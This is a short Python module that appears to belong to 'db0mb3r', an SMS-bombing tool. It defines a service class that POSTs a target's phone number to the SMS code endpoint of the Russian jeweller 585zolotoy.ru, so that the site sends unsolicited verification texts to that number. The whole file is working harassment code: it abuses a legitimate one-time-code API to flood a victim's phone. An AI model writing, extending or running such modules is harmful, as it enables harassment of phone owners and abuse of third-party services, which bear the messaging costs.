from db0mb3r.services.service import Service


class Zolotoy585(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://www.585zolotoy.ru/api/sms/send_code/",
            headers={
                "client-type": "WEB",
                "company": "3e6efe10-defd-4983-94a1-c5a4d3cb3689",
                "region": "75c221cc-0386-4631-b47c-f8951d820a07",
            },
            json={"phone": self.formatted_phone,},
        )
